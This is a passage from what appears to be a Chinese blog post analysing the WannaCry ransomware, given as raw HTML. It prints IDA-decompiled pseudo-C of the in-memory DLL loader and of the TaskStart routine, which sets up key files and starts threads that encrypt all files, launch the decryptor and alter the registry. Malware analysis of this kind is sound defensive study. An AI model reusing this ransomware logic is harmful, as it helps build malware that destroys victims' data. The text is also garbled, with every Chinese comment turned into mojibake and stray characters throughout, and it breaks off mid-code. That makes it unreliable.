class="line">((<span class="keyword">void</span>Â (__cdeclÂ *)(<span class="keyword">int</span>,Â _DWORD,Â <span class="keyword">signed</span>Â <span class="keyword">int</span>,Â <span class="keyword">int</span>))VirtualFree_Addr)(pAllocAddress,Â <span class="number">0</span>,Â <span class="number">0x8000</span>,Â a8);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_24;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">*(_DWORDÂ *)(pHeapAddressÂ +Â <span class="number">4</span>)Â =Â pAllocAddress;Â Â </span><br><span class="line"></span><br><span class="line">LOWORD(pHeapAddress)Â =Â *((_WORDÂ *)NtHeaderÂ +Â <span class="number">11</span>);Â Â </span><br><span class="line"></span><br><span class="line">pHeapBase[<span class="number">5</span>]Â =Â (pHeapAddressÂ &gt;&gt;Â <span class="number">13</span>)Â &amp;Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line">pHeapBase[<span class="number">7</span>]Â =Â VirtualAlloc_Addr;Â Â </span><br><span class="line"></span><br><span class="line">pHeapBase[<span class="number">8</span>]Â =Â VirtualFree_Addr;Â Â </span><br><span class="line"></span><br><span class="line">pHeapBase[<span class="number">9</span>]Â =Â LoadLibraryA_Addr;Â Â </span><br><span class="line"></span><br><span class="line">pHeapBase[<span class="number">10</span>]Â =Â GetProcAddress_Addr;Â Â </span><br><span class="line"></span><br><span class="line">pHeapBase[<span class="number">11</span>]Â =Â FreeLibrary_Addr;Â Â </span><br><span class="line"></span><br><span class="line">pHeapBase[<span class="number">12</span>]Â =Â a8;Â Â </span><br><span class="line"></span><br><span class="line">pHeapBase[<span class="number">14</span>]Â =Â v27;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !CmpFileSize(FileSize,Â *((_DWORDÂ *)NtHeaderÂ +Â <span class="number">0x15</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â æ¯”è¾ƒæ–‡ä»¶å¤§å°æ˜¯å¦å¤§äºç­‰äºSizeOfHeadersÂ Â 0x1000Â Â </span></span><br><span class="line"></span><br><span class="line">||Â (AllocAddrÂ =Â (<span class="keyword">char</span>Â *)((<span class="keyword">int</span>Â (__cdeclÂ *)(<span class="keyword">int</span>,Â _DWORD,Â <span class="keyword">signed</span>Â <span class="keyword">int</span>,Â <span class="keyword">signed</span>Â <span class="keyword">int</span>,Â <span class="keyword">int</span>))VirtualAlloc_Addr)(Â Â </span><br><span class="line"></span><br><span class="line">pAllocAddress,Â Â </span><br><span class="line"></span><br><span class="line">*((_DWORDÂ *)NtHeaderÂ +Â <span class="number">21</span>),Â Â </span><br><span class="line"></span><br><span class="line"><span class="number">0x1000</span>,Â Â </span><br><span class="line"></span><br><span class="line"><span class="number">4</span>,Â Â </span><br><span class="line"></span><br><span class="line">a8),Â </span><br><span class="line"><span class="comment">//Â ç”³è¯·ä¸€å—å¤§å°ä¸º0x1000çš„å¯è¯»å¯å†™çš„å†…å­˜Â Â 0x1000æ˜¯SizeOfHeadersÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(AllocAddr,Â pFileBase,</span><br><span class="line">*((_DWORDÂ *)NtHeaderÂ +Â <span class="number">21</span>)),</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â æŠŠPEå¤´æ‹·è´åˆ°ç”³è¯·çš„å †ç©ºé—´Â Â </span></span><br><span class="line"></span><br><span class="line">NtHeaderBaseAddrÂ =Â (<span class="keyword">int</span>)&amp;AllocAddr[*((_DWORDÂ *)pFileBaseÂ +Â <span class="number">0xF</span>)],Â Â </span><br><span class="line"></span><br><span class="line">*pHeapBaseÂ =Â NtHeaderBaseAddr,Â Â </span><br><span class="line"></span><br><span class="line">*(_DWORDÂ *)(NtHeaderBaseAddrÂ +Â <span class="number">52</span>)Â =Â pAllocAddress,Â Â </span><br><span class="line"></span><br><span class="line">!sub_402470((<span class="keyword">int</span>)pFileBase,Â FileSize,Â (<span class="keyword">int</span>)NtHeader,Â (<span class="keyword">int</span>)pHeapBase))Â Â </span><br><span class="line"></span><br><span class="line">||Â (*(_DWORDÂ *)(*pHeapBaseÂ +Â <span class="number">52</span>)Â ==Â *((_DWORDÂ *)NtHeaderÂ +Â <span class="number">13</span>)Â ?Â (pHeapBase[<span class="number">6</span>]Â =Â <span class="number">1</span>)Â :Â (pHeapBase[<span class="number">6</span>]Â =Â sub_402758(pHeapBase,Â *(_DWORDÂ *)(*pHeapBaseÂ +Â <span class="number">52</span>)Â -Â *((_DWORDÂ *)NtHeaderÂ +Â <span class="number">13</span>))),Â Â </span><br><span class="line"></span><br><span class="line">!sub_4027DF(pHeapBase)Â ||Â !sub_40254B(pHeapBase)Â ||Â !sub_40271D(pHeapBase))Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">LABEL_37:Â Â </span><br><span class="line"></span><br><span class="line">sub_4029CC(pHeapBase);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">v24Â =Â *(_DWORDÂ *)(*pHeapBaseÂ +Â <span class="number">40</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â v24Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â pHeapBase[<span class="number">5</span>]Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !((<span class="keyword">int</span>Â (__stdcallÂ *)(<span class="keyword">int</span>,Â <span class="keyword">signed</span>Â <span class="keyword">int</span>,Â _DWORD))(pAllocAddressÂ +Â v24))(pAllocAddress,Â <span class="number">1</span>,Â <span class="number">0</span>)Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">SetLastError(<span class="number">0x45A</span>u);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_37;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">pHeapBase[<span class="number">4</span>]Â =Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">pHeapBase[<span class="number">13</span>]Â =Â pAllocAddressÂ +Â v24;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">pHeapBase[<span class="number">13</span>]Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â pHeapBase;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ç”³è¯·äº†ä¸€å—å †ç©ºé—´ å¹¶å°†å»æ‰äº†è§£å¯†å‡ºçš„PEæ–‡ä»¶çš„DOSå¤´å¹¶æ‹·è´åˆ°äº†å †ç©ºé—´ä¸­</p><h3 id="5-3-6-GetExportFunAddr-è·å–å¯¼å‡ºå‡½æ•°åœ°å€"><a href="#5-3-6-GetExportFunAddr-è·å–å¯¼å‡ºå‡½æ•°åœ°å€" class="headerlink" title="5.3.6 GetExportFunAddr è·å–å¯¼å‡ºå‡½æ•°åœ°å€"></a>5.3.6 GetExportFunAddr è·å–å¯¼å‡ºå‡½æ•°åœ°å€</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">AllocBaseÂ =Â (_DWORDÂ )(pHeapBaseÂ +Â <span class="number">4</span>);Â Â <span class="comment">//Â AllocBase=0x10000000Â æ˜¯ç”³è¯·çš„ç©ºé—´çš„åŸºå€Â Â </span></span><br><span class="line"></span><br><span class="line">DataDirectoryÂ =Â (<span class="keyword">int</span>)((_DWORDÂ )pHeapBaseÂ +Â <span class="number">0x78</span>);<span class="comment">//Â peå¤´+0x78=æ•°æ®ç›®å½•è¡¨Â Â </span></span><br><span class="line"></span><br><span class="line">AllocBase_2Â =Â (_DWORDÂ )(pHeapBaseÂ +Â <span class="number">4</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !(_DWORDÂ )((_DWORDÂ )pHeapBaseÂ +Â <span class="number">0x7C</span>)Â )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_12;Â Â </span><br><span class="line"></span><br><span class="line">ExportRVAÂ =Â DataDirectory;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å–å‡ºæ•°æ®ç›®å½•è¡¨çš„ç¬¬ä¸€é¡¹-&gt;å¯¼å‡ºè¡¨çš„RVAÂ Â </span></span><br><span class="line"></span><br><span class="line">NumberOfNamesÂ =Â (_DWORDÂ )(DataDirectoryÂ +Â AllocBaseÂ +Â <span class="number">0x18</span>);<span class="comment">//Â å–å‡ºä»¥åç§°æ–¹å¼å¯¼å‡ºçš„å‡½æ•°æ•°é‡Â Â </span></span><br><span class="line"></span><br><span class="line">ExportVAÂ =Â (_DWORDÂ )(AllocBaseÂ +Â ExportRVA);Â <span class="comment">//Â åŸºå€+å¯¼å‡ºè¡¨çš„RVA=å¯¼å‡ºè¡¨çš„VAÂ Â </span></span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•° å †ç©ºé—´çš„é¦–åœ°å€ å’ŒTaskStartè¿™ä¸ªå­—ç¬¦ä¸²<br>å¹¶è¿”å›äº†å¯¼å‡ºå‡½æ•°åœ°å€</p><p>å¯¹äºå‡½æ•°é€»è¾‘ï¼šè¿™ä¸ªå‡½æ•°é¦–å…ˆå–å‡ºäº†æ•°æ®ç›®å½•è¡¨ï¼Œå¹¶æ ¹æ®æ•°æ®ç›®å½•è¡¨æ‰¾åˆ°äº†å¯¼å‡ºè¡¨ï¼Œæ¥ç€æˆ‘ä»¬çœ‹ä¸€ä¸‹dllæ–‡ä»¶çš„å¯¼å‡ºè¡¨ï¼š</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image18.png" class="" width="18"><p>å›¾åå…­ï¼št_wnry.dll å¯¼å‡ºè¡¨</p><p>å¾—çŸ¥TaskStartå°±æ˜¯ä¼ è¿›å»çš„ç¬¬äºŒä¸ªå‚æ•°</p><h2 id="5-4-å°ç»“"><a href="#5-4-å°ç»“" class="headerlink" title="5.4 å°ç»“"></a>5.4 å°ç»“</h2><ol><li><p> è·å–å¿…è¦çš„APIå‡½æ•°åœ°å€</p></li><li><p> å¯¼å…¥ç§é’¥å¹¶ç”³è¯·ç©ºé—´</p></li><li><p> ç”¨å¯¼å…¥çš„ç§é’¥è§£å¯†å‡ºä¸€ä¸ªdll</p></li><li><p> ç”³è¯·ä¸€å—å †ç©ºé—´ å°†dllå†™å…¥åˆ°å †å†…å­˜é‡Œ</p></li><li><p> åœ¨å †å†…å­˜ä¸­æ‰¾åˆ°dllçš„å¯¼å‡ºå‡½æ•°åœ°å€ å¹¶è°ƒç”¨</p></li></ol><p>ä»ä¸Šé¢çš„åˆ†æå¯ä»¥å¾—å‡ºç—…æ¯’çš„ä¸»ä½“ç¨‹åºå®é™…ä¸Šåªåšäº†ä¸€äº›åˆå§‹åŒ–çš„æ“ä½œ<br>åˆ°ç›®å‰ä¸ºæ­¢å¹¶æ²¡æœ‰çœ‹åˆ°å®ƒæ„ŸæŸ“æˆ–åŠ å¯†ä»»ä½•ä¸€ä¸ªæ–‡ä»¶ ä¹Ÿæ²¡æœ‰å¯¹ç”¨æˆ·è¿›è¡Œå‹’ç´¢<br>çœŸæ­£çš„æ ¸å¿ƒä»£ç åœ¨t.wnryä¸­ ç”±äºè¿™ä¸ªå‡½æ•°æ˜¯åœ¨å †ç©ºé—´ä¸­è°ƒç”¨<br>æ‰€ä»¥åœ¨IDAä¸­å¹¶æ²¡æœ‰æ˜¾ç¤ºå‡ºä¼ªCä»£ç  é‚£ä¹ˆæ¥ä¸‹æ¥éœ€è¦åˆ†æåˆšåˆšæå–å‡ºæ¥çš„dll</p><h2 id="5-5-åŠ è½½ç—…æ¯’æ ¸å¿ƒæ“ä½œ"><a href="#5-5-åŠ è½½ç—…æ¯’æ ¸å¿ƒæ“ä½œ" class="headerlink" title="5.5 åŠ è½½ç—…æ¯’æ ¸å¿ƒæ“ä½œ"></a>5.5 åŠ è½½ç—…æ¯’æ ¸å¿ƒæ“ä½œ</h2><p>åœ¨è¿™éƒ¨åˆ†æ‰€æ¶‰åŠçš„å‡½æ•°çš„æ“ä½œéƒ½åªæœ‰ä¸€ä¸ªç›®çš„ï¼Œå³åˆ©ç”¨dllæ–‡ä»¶ä¸­çš„å¯¼å‡ºå‡½æ•°ï¼Œä¸‹é¢æˆ‘ä»¬åˆ†æ­¥è¿›è¡Œåˆ†æ</p><h3 id="5-3-1-GetApis-è·å–å¿…è¦çš„APIå‡½æ•°-1"><a href="#5-3-1-GetApis-è·å–å¿…è¦çš„APIå‡½æ•°-1" class="headerlink" title="5.3.1 GetApis è·å–å¿…è¦çš„APIå‡½æ•°"></a>5.3.1 GetApis è·å–å¿…è¦çš„APIå‡½æ•°</h3><h1 id="6-t-wnry-dll-ç—…æ¯’æ ¸å¿ƒéƒ¨åˆ†åˆ†æ"><a href="#6-t-wnry-dll-ç—…æ¯’æ ¸å¿ƒéƒ¨åˆ†åˆ†æ" class="headerlink" title="6 t.wnry.dll ç—…æ¯’æ ¸å¿ƒéƒ¨åˆ†åˆ†æ"></a>6 t.wnry.dll ç—…æ¯’æ ¸å¿ƒéƒ¨åˆ†åˆ†æ</h1><h2 id="6-1-ä¸»ä½“é€»è¾‘"><a href="#6-1-ä¸»ä½“é€»è¾‘" class="headerlink" title="6.1 ä¸»ä½“é€»è¾‘"></a>6.1 ä¸»ä½“é€»è¾‘</h2><p>t.wnry.dll<br>ä½œä¸ºç—…æ¯’çš„æ ¸å¿ƒéƒ¨åˆ†ï¼ŒåŒ…æ‹¬äº†ç—…æ¯’æ‰€æœ‰çš„å±å®³æ“ä½œï¼ŒåŒ…æ‹¬åŠ å¯†è§£å¯†æ–‡ä»¶ï¼Œå‹’ç´¢ç”¨æˆ·ç­‰æœ‰å®³æ“ä½œï¼Œä¸‹é¢æˆ‘å°†ä¸ºå¤§å®¶ä¸€æ­¥æ­¥çš„è¿›è¡Œåˆ†æï¼š</p><h3 id="6-1-1-TaskStart-ç—…æ¯’çš„é€»è¾‘ä¸»ä½“å‡½æ•°"><a href="#6-1-1-TaskStart-ç—…æ¯’çš„é€»è¾‘ä¸»ä½“å‡½æ•°" class="headerlink" title="6.1.1 TaskStart ç—…æ¯’çš„é€»è¾‘ä¸»ä½“å‡½æ•°"></a>6.1.1 TaskStart ç—…æ¯’çš„é€»è¾‘ä¸»ä½“å‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>Â __stdcallÂ <span class="title">TaskStart</span><span class="params">(HMODULEÂ hModule,Â <span class="keyword">int</span>Â a2)</span>Â </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â a2Â ||Â RunSingle()Â )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â äº’æ–¥ä½“é˜²åŒå¼€Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">FilenameÂ =Â word_1000D918;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åˆå§‹åŒ–ç¼“å†²åŒºÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;v12,Â <span class="number">0</span>,Â <span class="number">0x204</span>u);Â Â </span><br><span class="line"></span><br><span class="line">v13Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">GetModuleFileNameW(hModule,Â &amp;Filename,Â <span class="number">0x103</span>u);<span class="comment">//Â è·å–å½“å‰è¿›ç¨‹çš„å®Œæ•´è·¯å¾„Â Â </span></span><br><span class="line"></span><br><span class="line">ifÂ (Â wcsrchr(&amp;Filename,Â &#x27;&#x27;)Â )Â Â *wcsrchr(&amp;Filename,Â &#x27;&#x27;)Â =Â 0;Â Â Â Â Â Â Â Â Â Â Â Â Â Â //Â è·å–åˆ°å­—ç¬¦ä¸²-&gt;.wcry.exeÂ Â Â </span><br><span class="line"></span><br><span class="line">SetCurrentDirectoryW(&amp;Filename);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !ReadFileToMem(&amp;c_wnryBase,Â <span class="number">1</span>)Â )Â Â Â Â Â Â Â Â Â <span class="comment">//Â è¯»å–c.wnryåˆ°å†…å­˜Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">StartIsSuccessÂ =Â GetUsersidAndCmp();Â Â Â Â Â Â Â <span class="comment">//Â è·å–å½“å‰ç”¨æˆ·çš„SIDå¹¶ä¸ç³»ç»Ÿçš„SIDä½œæ¯”è¾ƒÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !GetApis()Â )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–å¿…è¦çš„APIå‡½æ•°åœ°å€Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(FileName_0,Â a08xRes,Â <span class="number">0</span>);Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â Dest=00000000.resÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(FileName,Â a08xPky,Â <span class="number">0</span>);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â FileName=00000000.pkyÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(buff,Â a08xEky,Â <span class="number">0</span>);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â buff=00000000.ekyÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â SetAccessControl(<span class="number">0</span>)Â ||Â sub_10004500(<span class="number">0</span>)Â )Â </span><br><span class="line"></span><br><span class="line"><span class="comment">//Â 1.è®¾ç½®è®¿é—®æ§åˆ¶å±æ€§Â 2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨00000000.pkyè¿™ä¸ªæ–‡ä»¶Â ç”±äºä¸å­˜åœ¨Â ç›´æ¥returnÂ Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">hThreadÂ =Â CreateThread(<span class="number">0</span>,Â <span class="number">0</span>,Â (LPTHREAD_START_ROUTINE)StartExeAndSetReg,<span class="number">0</span>,Â <span class="number">0</span>,Â <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â æ¡ä»¶ä¸æˆç«‹Â è·³è¿‡è¿™ä¸ªifåˆ†æ”¯Â éšè—åˆ†æ”¯å¾…åˆ†æÂ Â </span></span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,Â <span class="number">0xFFFFFFFF</span>);Â Â </span><br><span class="line"></span><br><span class="line">CloseHandle(hThread);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">lpAddressÂ =Â (<span class="keyword">char</span>)<span class="keyword">operator</span>Â <span class="keyword">new</span>(<span class="number">0x28</span>u);Â Â Â Â Â Â <span class="comment">//Â ç”³è¯·ä¸€å—å†…å­˜ç©ºé—´Â Â </span></span><br><span class="line"></span><br><span class="line">v14Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â lpAddressÂ )Â Â </span><br><span class="line"></span><br><span class="line">v3Â =Â InitializeCriSection(lpAddress);Â Â Â Â Â Â Â <span class="comment">//Â åˆå§‹åŒ–ä¸´ç•ŒåŒºÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">v3Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">v14Â =Â <span class="number">-1</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !v3Â ||Â !CreatePkyAndEky(v3,Â FileName,Â buff)Â )</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â åˆ›å»º00000000.pkyå’Œ00000000.ekyÂ ä¸€ä¸ªæ˜¯å…¬é’¥Â ä¸€ä¸ªæ˜¯åŠ å¯†åçš„ç§é’¥Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !OpenResFile()Â ||Â dword_1000DC70Â )Â <span class="comment">//Â æ‰“å¼€00000000.resæ–‡ä»¶Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">DeleteFileA(FileName_0);Â Â </span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;RandomBytes,Â <span class="number">0</span>,Â <span class="number">0x88</span>u);Â Â </span><br><span class="line"></span><br><span class="line">dword_1000DC70Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">GetRandom((HCRYPTPROV)v3,Â &amp;RandomBytes,Â <span class="number">8u</span>);<span class="comment">//Â è·å–0x8ä¸ªå­—èŠ‚çš„éšæœºæ•°Â Â </span></span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">DestoryHandle(v3);Â Â </span><br><span class="line"></span><br><span class="line">((<span class="keyword">void</span>Â (__thiscallÂ )(<span class="keyword">char</span>Â ,Â <span class="keyword">signed</span>Â <span class="keyword">int</span>))v3)(v3,Â <span class="number">1</span>);<span class="comment">//éšè—å‡½æ•°Â ç”¨äºé‡Šæ”¾ä¸´ç•ŒåŒºÂ Â </span></span><br><span class="line"></span><br><span class="line">hThread_1Â =Â CreateThread(<span class="number">0</span>,Â <span class="number">0</span>,Â (LPTHREAD_START_ROUTINE)CreateResFile,Â <span class="number">0</span>,Â <span class="number">0</span>,Â <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â åˆ›å»º00000000.resæ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â hThread_1Â )Â Â </span><br><span class="line"></span><br><span class="line">CloseHandle(hThread_1);Â Â </span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">100u</span>);Â Â </span><br><span class="line"></span><br><span class="line">hThread_2Â =Â CreateThread(<span class="number">0</span>,Â <span class="number">0</span>,Â (LPTHREAD_START_ROUTINE)CheckDky,Â <span class="number">0</span>,Â <span class="number">0</span>,Â <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â æ¯éš”äº”ç§’æ£€æµ‹æ˜¯å¦å­˜åœ¨774F34B5.dkyè¿™ä¸ªæ–‡ä»¶Â ç”±äºæ–‡ä»¶ä¸å­˜åœ¨Â ç›´æ¥returnÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â hThread_2Â )Â Â </span><br><span class="line"></span><br><span class="line">CloseHandle(hThread_2);Â Â </span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">100u</span>);Â Â </span><br><span class="line"></span><br><span class="line">hThread_3Â =Â CreateThread(<span class="number">0</span>,Â <span class="number">0</span>,Â (LPTHREAD_START_ROUTINE)EncryptAllFiles,Â <span class="number">0</span>,Â <span class="number">0</span>,Â <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â åŠ å¯†æ‰€æœ‰æ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">100u</span>);Â Â </span><br><span class="line"></span><br><span class="line">hThread_4Â =Â CreateThread(<span class="number">0</span>,Â <span class="number">0</span>,Â StartTaskdl,Â <span class="number">0</span>,Â <span class="number">0</span>,Â <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â æ¯éš”ä¸‰ç§’ä»¥éšè—çš„æ–¹å¼å¯åŠ¨taskdl.exeÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â hThread_4Â )Â Â </span><br><span class="line"></span><br><span class="line">CloseHandle(hThread_4);Â Â </span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">100u</span>);Â Â </span><br><span class="line"></span><br><span class="line">hThread_5Â =Â CreateThread(<span class="number">0</span>,Â <span class="number">0</span>,(LPTHREAD_START_ROUTINE)StartExeAndSetReg,Â <span class="number">0</span>,Â <span class="number">0</span>,Â <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â æ¯éš”ä¸‰ç§’Â å¯åŠ¨taskse.exeå’Œ@WanaDecryptor@.exeå¹¶ä¸”ä¿®æ”¹æ³¨å†Œè¡¨Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â hThread_5Â 